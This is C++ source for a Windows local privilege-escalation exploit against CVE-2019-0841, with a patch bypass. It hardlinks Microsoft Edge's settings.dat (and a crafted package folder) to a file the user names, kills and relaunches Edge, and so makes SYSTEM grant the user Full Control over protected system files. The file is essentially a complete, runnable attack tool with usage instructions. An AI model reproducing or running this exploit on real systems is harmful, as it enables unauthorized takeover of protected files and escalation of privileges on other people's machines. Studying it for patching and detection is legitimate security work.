// ACLtakeoverLPE.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"
#include <TlHelp32.h>
#include <tchar.h>
#include "winbase.h"
#include <wchar.h>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <aclapi.h>
#include <iostream>
#include <fstream>
#include <iostream>
#include "base64.h"
#include <atlbase.h>
#include <atlconv.h>
#include "resource2.h"
#pragma comment(lib, "advapi32.lib")
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif

// Reference: https://docs.microsoft.com/en-us/windows/desktop/fileio/opening-a-file-for-reading-or-writing
#define BUFFERSIZE 8192
DWORD g_BytesTransferred = 0;
VOID CALLBACK FileIOCompletionRoutine(
	__in  DWORD dwErrorCode,
	__in  DWORD dwNumberOfBytesTransfered,
	__in  LPOVERLAPPED lpOverlapped
);

VOID CALLBACK FileIOCompletionRoutine(
	__in  DWORD dwErrorCode,
	__in  DWORD dwNumberOfBytesTransfered,
	__in  LPOVERLAPPED lpOverlapped)
{
	_tprintf(TEXT("Error code:\t%x\n"), dwErrorCode);
	_tprintf(TEXT("Number of bytes:\t%x\n"), dwNumberOfBytesTransfered);
	g_BytesTransferred = dwNumberOfBytesTransfered;
}



bool CheckFilePermissions(_TCHAR* target) {
	_tprintf(_T("[+] Checking File privileges of %s\n"), target);
	FILE *fp = _wfopen(target, TEXT("a"));
	if (fp == NULL) {
		if (errno == EACCES) {
			std::cerr << "[+] You don't have 'Modify/Write' privileges on this file ..." << std::endl;
			return false;
		}
		else {
			std::cerr << "[+] Something went wrong: " << strerror(errno) << std::endl;
			return false;
		}
	}
	else {
		printf("[+] You have 'Full Control' over this file!\n");
		return true;
	}
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname)
{
	std::wstring full_linkname = BuildFullPath(linkname, true);
	size_t len = full_linkname.size() * sizeof(WCHAR);

	typed_buffer_ptr<FILE_LINK_INFORMATION> link_info(sizeof(FILE_LINK_INFORMATION) + len - sizeof(WCHAR));

	memcpy(&link_info->FileName[0], full_linkname.c_str(), len);
	link_info->ReplaceIfExists = TRUE;
	link_info->FileNameLength = len;

	std::wstring full_targetname = BuildFullPath(targetname, true);

	HANDLE hFile = OpenFileNative(full_targetname.c_str(), nullptr, MAXIMUM_ALLOWED, FILE_SHARE_READ, 0);
	if (hFile)
	{
		DEFINE_NTDLL(ZwSetInformationFile);
		IO_STATUS_BLOCK io_status = { 0 };

		NTSTATUS status = fZwSetInformationFile(hFile, &io_status, link_info, link_info.size(), FileLinkInformation);
		CloseHandle(hFile);
		if (NT_SUCCESS(status))
		{
			return true;
		}
		SetNtLastError(status);
	}

	return false;
}

bool IsProcessRunning(const wchar_t* processName) {
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry)) {
			if (!wcsicmp(entry.szExeFile, processName))
				exists = true;
		}

	CloseHandle(snapshot);
	return exists;
}

void killProcessByName(const wchar_t* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcscmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

bool FileExists(const wchar_t* file) {
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(file) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		return false;
	}
	else {
		return true;
	}
}

bool CreateHardlink(_TCHAR* src, _TCHAR* dst) {
	if (CreateNativeHardlink(src, dst))
	{
		//printf("[+] Done!\n");
		return true;

	}
	else
	{
		printf("Error creating hardlink: %ls\n", GetErrorMessage().c_str());
		return false;
	}
}

void killEdge() {
	if (IsProcessRunning(L"MicrosoftEdge.exe")) {
		while (IsProcessRunning(L"MicrosoftEdge.exe")) {
			printf("[!] Microsoft Edge is running :(\n");
			printf("[!] File is in use by NT AUTHORITY\\SYSTEM ...\n");
			printf("[!] Killing Microsoft Edge ... ");
			killProcessByName(L"MicrosoftEdge.exe");
			printf("DONE\n");
			printf("[+] Retrying ...\n");
		}
	}
	else {
		printf("[+] Microsoft Edge is not running :)\n");
	}
}

#define DEBUG_VERSION 

/* Code to achieve the bypass of patch for CVE-2019-0841 */
void bypass(_TCHAR* EdgeVersion, _TCHAR* targetpath) {
	
	wchar_t *userprofile = _wgetenv(L"USERPROFILE");
	wchar_t *relpath = (L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Microsoft.MicrosoftEdge_"); 
	wchar_t *finalpath = L"_neutral__8wekyb3d8bbwe";
	wchar_t *finalfile = L"\\zc00l.txt";
	std::wstring fullpath(userprofile);
	fullpath += std::wstring(relpath);
	fullpath += std::wstring(EdgeVersion); 
	fullpath += std::wstring(finalpath);
	TCHAR * szBuffsrc = (wchar_t *)fullpath.c_str(); //MS Edge bypass folder
	std::wstring filepath(userprofile);
	filepath += std::wstring(relpath);
	filepath += std::wstring(EdgeVersion);
	filepath += std::wstring(finalpath);
	filepath += std::wstring(finalfile);
	TCHAR * szBuffsrcFile = (wchar_t *)filepath.c_str(); //MS Edge bypass file

	/*
	To achieve multiple/sucessive execution in a clean way, this is required.
	*/
	if (FileExists(szBuffsrcFile)) {
		DeleteFile(szBuffsrcFile);
	}
	RemoveDirectory(szBuffsrc);
	CreateDirectory(szBuffsrc, NULL);
	
	wprintf(L"[+] Creating hardlink bypass ... ");
	if (CreateNativeHardlink(szBuffsrcFile, targetpath)) {
		wprintf(L"DONE!\n");
	}
	else {
		wprintf(L"FAILED!\n");
	}
}

/* Convert char* to wchar_t* */
// Reference: https://stackoverflow.com/questions/8032080/how-to-convert-char-to-wchar-t
wchar_t *GetWC(const char *c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);

	return wc;
}

/* 
Fill a buffer with WCHAR string of the current Microsoft Edge version 
Author: @_zc00l
*/
WCHAR* GetEdgeVersion()
{
	OVERLAPPED ol = { 0 };
	char ReadBuffer[BUFFERSIZE] = { 0 };
	WCHAR *EdgeConfigurationFile = L"C:\\Windows\\SystemApps\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AppxManifest.xml";
	if (!FileExists(EdgeConfigurationFile))
	{
		wprintf(L"Could not determine the current edge version.\n");
		return NULL;
	}

	HANDLE hFile = CreateFile(EdgeConfigurationFile,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	if (FALSE == ReadFileEx(hFile, ReadBuffer, BUFFERSIZE - 1, &ol, FileIOCompletionRoutine))
	{
		printf("Terminal failure: Unable to read from file.\n GetLastError=%08x\n", GetLastError());
		CloseHandle(hFile);
		return NULL;
	}

	// Ugly way to find our version buffer from the file stream.
	char *found = NULL;
	char *token = NULL;
	char *sep = " ";
	char *sep2 = "\"";
	
	token = strtok(ReadBuffer, sep);
	
	while (token != NULL)
	{
		/* 
		The first Alpha-case "Version" that is located in this file 
		belongs to the XML key <Identity> which edge version for the 
		current computer.
		*/
		found = strstr(token, "Version=\"");
		if (found != NULL) {
			token = strtok(found, sep2);
			token = strtok(NULL, sep2); // Jump 'Version='
			printf("[+] Found edge version: %s\n", token);
			CloseHandle(hFile);
			return GetWC(token); // We need it in WCHAR!
		}
		token = strtok(NULL, sep);
	}

	CloseHandle(hFile);
	return NULL;
}

void gimmeroot(_TCHAR* targetpath, bool hijack) {
	wchar_t *debugVersion = GetEdgeVersion();
	bypass(debugVersion, targetpath);
	wchar_t *userprofile = _wgetenv(L"USERPROFILE");
	wchar_t *relpath = (L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\settings.dat"); //MS Edge Settings file location
	std::wstring fullpath(userprofile);
	fullpath += std::wstring(relpath);
	TCHAR * szBuffsrc = (wchar_t *)fullpath.c_str(); //MS Edge Settings file

	if (CheckFilePermissions(targetpath)) {
		exit(EXIT_FAILURE);
	}
	killEdge();
	printf("[+] Checking if 'settings.dat' file exists ... ");
	if (FileExists(szBuffsrc)) {
		printf("YES\n");
		printf("[!] Attempting to create a hardlink to target ... ");
		if (CreateHardlink(szBuffsrc, targetpath)) {
			printf("DONE\n");
		}
		Sleep(3000);
		printf("[+] Starting up Microsoft Edge to force reset ...\n");
		try {
			system("start microsoft-edge:");
		}
		catch (...) {

		}
		Sleep(3000);
		printf("[!] Killing Microsoft Edge again ... \n");
		killProcessByName(L"MicrosoftEdge.exe");
		_tprintf(_T("[+] Checking File privileges again ...\n"));
		if (!CheckFilePermissions(targetpath)) {
			printf("[!] File Takeover Failed! \n");
			printf("[!] File might be in use by another process or NT AUTHORITY\\SYSTEM does not have 'Full Control' permissions on the file! \n");
			printf("[!] Try another file ... \n");
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{

	if (argc < 2) {
		printf("# Privileged DACL Overwrite EoP\n");
		printf("# CVE: CVE-2019-0841\n");
		printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
		printf("# Bypass mods: Andre Marques (@_zc00l)\n");
		printf("# Tested on: Microsoft Windows 10 x32 & x64\n");
		printf("# Category: Local\n");
		printf("-------------------------------------------------\n");
		printf("[+] Usage: exploit.exe <path to file to takeover>\n");
		printf("[+] (E.g., exploit.exe C:\\Windows\\win.ini\n");
		printf("-------------------------------------------------\n");
	}
	else {
		try {
			if (argc < 3) {
				printf("# Privileged DACL Overwrite EoP\n");
				printf("# CVE: CVE-2019-0841\n");
				printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
				printf("# Bypass mods: Andre Marques (@_zc00l)\n");
				printf("# Tested on: Microsoft Windows 10 x32 & x64\n");
				printf("# Category: Local\n");
				printf("-------------------------------------------------\n");
				printf("\n");
				printf("\n");
				gimmeroot(argv[1], false);
			}

		}
		catch (...) {

		}
	}


	exit(0);
}





